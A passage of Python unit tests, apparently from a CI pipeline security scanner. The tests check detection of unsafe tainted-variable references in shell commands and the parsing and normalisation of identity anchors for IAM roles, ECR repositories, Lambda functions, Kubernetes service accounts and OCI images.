    def test_no_reference_returns_false(self):
        assert tainted_variables.has_unsafe_reference(
            ["echo hello"], {"TAINTED"}, ref_pattern=_shell_ref,
        ) is False

    def test_empty_names_returns_false(self):
        """No tainted names → nothing to look for, never flag."""
        assert tainted_variables.has_unsafe_reference(
            ["echo $ANY"], set(), ref_pattern=_shell_ref,
        ) is False

    def test_multiple_names_finds_first_unsafe(self):
        assert tainted_variables.has_unsafe_reference(
            ["echo $A", 'echo "$B"', "echo $C"],
            {"A", "B", "C"},
            ref_pattern=_shell_ref,
        ) is True

    def test_ref_pattern_called_per_name(self):
        """The provider-supplied ``ref_pattern`` is the abstraction
        knob — exercise that ADO-style ``$(VAR)`` matching works
        through the same primitive."""
        def ado_ref(n): return rf"\$\(\s*{_re.escape(n)}\s*\)"
        assert tainted_variables.has_unsafe_reference(
            ["deploy --branch $(TAINTED)"], {"TAINTED"}, ref_pattern=ado_ref,
        ) is True
        # Same input, but with the bash-style ref_pattern — must NOT match.
        assert tainted_variables.has_unsafe_reference(
            ["deploy --branch $(TAINTED)"], {"TAINTED"}, ref_pattern=_shell_ref,
        ) is False


# ──────────────────────────────────────────────────────────────────
# anchors
# ──────────────────────────────────────────────────────────────────


class TestIamRoleAnchor:
    def test_canonical_arn_round_trips(self):
        arn = "arn:aws:iam::123456789012:role/deploy-admin"
        a = anchors.iam_role(arn)
        assert a is not None
        assert a.kind == "iam_role"
        assert a.identity == arn

    def test_govcloud_partition_accepted(self):
        arn = "arn:aws-us-gov:iam::123456789012:role/deploy"
        a = anchors.iam_role(arn)
        assert a is not None
        assert a.identity == arn

    def test_role_path_preserved(self):
        # IAM role names can carry a path: ``service-role/svc-foo``.
        arn = "arn:aws:iam::123456789012:role/service-role/svc-foo"
        a = anchors.iam_role(arn)
        assert a is not None

    def test_short_name_rejected(self):
        # A bare role name MUST NOT be accepted as a full-ARN anchor;
        # use iam_role_name() for that.
        assert anchors.iam_role("deploy-admin") is None

    def test_malformed_arn_rejected(self):
        # ``user/`` instead of ``role/``.
        assert anchors.iam_role(
            "arn:aws:iam::123456789012:user/deploy-admin"
        ) is None
        # Missing account ID.
        assert anchors.iam_role("arn:aws:iam:::role/deploy") is None
        # Empty string.
        assert anchors.iam_role("") is None

    def test_non_string_input_returns_none(self):
        assert anchors.iam_role(None) is None  # type: ignore[arg-type]
        assert anchors.iam_role(12345) is None  # type: ignore[arg-type]


class TestIamRoleNameAnchor:
    def test_accepts_bare_name(self):
        a = anchors.iam_role_name("deploy-admin")
        assert a is not None
        assert a.kind == "iam_role_name"
        assert a.identity == "deploy-admin"

    def test_does_not_match_full_arn_to_iam_role(self):
        # Critical contract: iam_role_name and iam_role are
        # different kinds, the chain engine must not fuzzy-match
        # one to the other.
        name = anchors.iam_role_name("deploy-admin")
        arn = anchors.iam_role(
            "arn:aws:iam::123456789012:role/deploy-admin"
        )
        assert name is not None
        assert arn is not None
        assert name != arn
        assert name.kind != arn.kind

    def test_rejects_invalid_characters(self):
        # A space in a role name is not legal in IAM.
        assert anchors.iam_role_name("deploy admin") is None

    def test_strips_whitespace(self):
        a = anchors.iam_role_name("  deploy-admin  ")
        assert a is not None
        assert a.identity == "deploy-admin"


class TestEcrRepoAnchor:
    def test_canonical_uri(self):
        uri = "123456789012.dkr.ecr.us-east-1.amazonaws.com/my-repo"
        a = anchors.ecr_repo(uri)
        assert a is not None
        assert a.kind == "ecr_repo"
        assert a.identity == uri

    def test_namespaced_repo(self):
        uri = (
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/team-a/svc"
        )
        a = anchors.ecr_repo(uri)
        assert a is not None
        assert a.identity == uri

    def test_tag_stripped(self):
        a = anchors.ecr_repo(
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/my-repo:v1"
        )
        assert a is not None
        assert a.identity.endswith("/my-repo")

    def test_digest_stripped(self):
        a = anchors.ecr_repo(
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/my-repo"
            "@sha256:" + "0" * 64
        )
        assert a is not None
        assert a.identity.endswith("/my-repo")

    def test_short_form_rejected(self):
        # Short repo names match across accounts — not safe as a
        # chain anchor.
        assert anchors.ecr_repo("my-repo") is None

    def test_dockerhub_uri_rejected(self):
        # Not an ECR URI.
        assert anchors.ecr_repo("docker.io/library/redis") is None


class TestLambdaFnAnchor:
    def test_canonical_arn(self):
        arn = "arn:aws:lambda:us-east-1:123456789012:function:my-fn"
        a = anchors.lambda_fn(arn)
        assert a is not None
        assert a.kind == "lambda_fn"
        assert a.identity == arn

    def test_alias_qualifier_stripped(self):
        # Two callers — one referencing the function by alias, one
        # by bare name — should meet at the same identity so a
        # chain rule reasoning about "this function's role" finds
        # them.
        with_alias = anchors.lambda_fn(
            "arn:aws:lambda:us-east-1:123456789012:function:my-fn:prod"
        )
        bare = anchors.lambda_fn(
            "arn:aws:lambda:us-east-1:123456789012:function:my-fn"
        )
        assert with_alias is not None
        assert bare is not None
        assert with_alias == bare

    def test_version_qualifier_stripped(self):
        a = anchors.lambda_fn(
            "arn:aws:lambda:us-east-1:123456789012:function:my-fn:$LATEST"
        )
        assert a is not None
        assert a.identity.endswith("function:my-fn")

    def test_malformed_arn_rejected(self):
        assert anchors.lambda_fn("my-fn") is None
        assert anchors.lambda_fn(
            "arn:aws:s3:::123456789012:function:my-fn"
        ) is None

    def test_qualifier_with_punctuation_rejected(self):
        # The buggy qualifier class ``[a-zA-Z0-9$-_]`` read ``$-_``
        # as a range from 0x24 to 0x5F and so accepted ``[``, ``]``,
        # ``@`` and other punctuation. After the fix (hyphen at end)
        # only the three literals ``$``, ``_``, ``-`` join the
        # alphanumerics.
        assert anchors.lambda_fn(
            "arn:aws:lambda:us-east-1:123456789012:function:my-fn:bad[name]"
        ) is None
        assert anchors.lambda_fn(
            "arn:aws:lambda:us-east-1:123456789012:function:my-fn:bad@name"
        ) is None

    def test_name_with_slash_rejected(self):
        # Slash never appears in Lambda function names; the name
        # class is ``[a-zA-Z0-9-_]+``. Locks the contract so a
        # future "loosen the class" refactor has to update this
        # test deliberately.
        assert anchors.lambda_fn(
            "arn:aws:lambda:us-east-1:123456789012:function:my/fn"
        ) is None


class TestK8sSaAnchor:
    def test_explicit_namespace(self):
        a = anchors.k8s_sa("kube-system", "default")
        assert a is not None
        assert a.kind == "k8s_sa"
        assert a.identity == "kube-system/default"

    def test_omitted_namespace_defaults_to_default(self):
        a = anchors.k8s_sa(None, "build-sa")
        assert a is not None
        assert a.identity == "default/build-sa"

    def test_empty_namespace_defaults_to_default(self):
        a = anchors.k8s_sa("", "build-sa")
        assert a is not None
        assert a.identity == "default/build-sa"

    def test_namespace_and_name_intersect_match(self):
        # Two anchors built independently must compare equal so
        # set intersection works as the chain engine expects.
        a = anchors.k8s_sa("ci", "runner")
        b = anchors.k8s_sa("ci", "runner")
        assert a == b
        assert {a} & {b} == {a}

    def test_uppercase_rejected(self):
        # K8s names are lowercase RFC 1123.
        assert anchors.k8s_sa("kube-system", "Default") is None

    def test_empty_name_rejected(self):
        assert anchors.k8s_sa("ci", "") is None


class TestOciImageAnchor:
    def test_tag_stripped(self):
        a = anchors.oci_image("nginx:1.27")
        assert a is not None
        assert a.kind == "oci_image"
        assert a.identity == "docker.io/library/nginx"

    def test_digest_stripped(self):
        a = anchors.oci_image("nginx@sha256:" + "a" * 64)
        assert a is not None
        assert a.identity == "docker.io/library/nginx"

    def test_implicit_dockerhub_library_namespace(self):
        # Bare name implies docker.io/library/<name>; the canonical
        # form makes two callers (one writes ``redis``, one writes
        # ``docker.io/library/redis``) meet at the same identity.
        bare = anchors.oci_image("redis")
        full = anchors.oci_image("docker.io/library/redis")
        assert bare == full

    def test_user_repo_on_dockerhub(self):
        # Two-component name under Docker Hub keeps its namespace
        # (``user/repo`` style, not implicitly ``library/``).
        a = anchors.oci_image("dmartinochoa/pipeline-check")
        assert a is not None
        assert a.identity == "docker.io/dmartinochoa/pipeline-check"

    def test_custom_registry_preserved(self):
        a = anchors.oci_image("ghcr.io/owner/repo:v1")
        assert a is not None
        assert a.identity == "ghcr.io/owner/repo"

    def test_registry_with_port_preserved(self):
        a = anchors.oci_image("registry.local:5000/owner/repo:v1")
        assert a is not None
        assert a.identity == "registry.local:5000/owner/repo"

    def test_empty_string_rejected(self):
        assert anchors.oci_image("") is None
